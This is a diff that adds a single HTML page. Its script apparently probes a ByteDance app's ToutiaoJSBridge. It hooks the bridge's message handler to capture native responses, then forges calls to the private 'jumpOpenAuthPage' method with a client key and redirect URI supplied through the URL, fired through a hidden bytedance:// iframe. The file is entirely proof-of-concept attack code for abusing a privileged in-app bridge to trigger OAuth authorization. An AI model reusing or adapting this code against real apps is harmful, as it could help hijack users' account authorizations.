@@ -1,0 +1,29 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>R50 auth</title></head><body>
+<h3 id="st">R50 oauth</h3><script>
+(function(){
+  var q={};location.search.replace(/[?&]([^=&]+)=([^&]*)/g,function(_,k,v){q[k]=decodeURIComponent(v);});
+  var CK=q.ck||'MISSING_CK', SC=q.scope||'user.info.basic', RD=q.redir||'';
+  function send(tag,d){try{document.getElementById('st').textContent=tag+':'+String(d).substring(0,250);}catch(e){}}
+  if(!window.ToutiaoJSBridge){send('nobridge',location.href);return;}
+  var orig=window.ToutiaoJSBridge._handleMessageFromToutiao;
+  window.ToutiaoJSBridge._handleMessageFromToutiao=function(s){
+    var t=(typeof s==='string')?s:JSON.stringify(s);
+    send('resp',t.substring(0,500));
+    try{if(orig)orig.call(window.ToutiaoJSBridge,s);}catch(e){}
+  };
+  function fire(id,params){
+    var msg={__msg_type:'call',__callback_id:id,func:'jumpOpenAuthPage',params:params,
+             JSSDK:'5.2.30',namespace:'',__iframe_url:'',permissionGroup:'private',token:'o-'+Date.now()};
+    window.ToutiaoJSBridge.invokeMethod(JSON.stringify(msg));
+    var f=document.getElementById('__JSBridgeIframe__')||document.createElement('iframe');
+    f.id='__JSBridgeIframe__';f.style.display='none';document.documentElement.appendChild(f);
+    f.src='bytedance://dispatch_message/';send('fired',id);
+  }
+  var base={client_key:CK,scope:SC,state:'r50'};
+  if(RD)base.redirect_uri=RD;
+  setTimeout(function(){fire('o_status',Object.assign({get_status_only:true},base));},1500);
+  setTimeout(function(){fire('o_full',base);},7000);
+  setTimeout(function(){send('late','title='+document.title);},15000);
+})();
+</script></body></html>
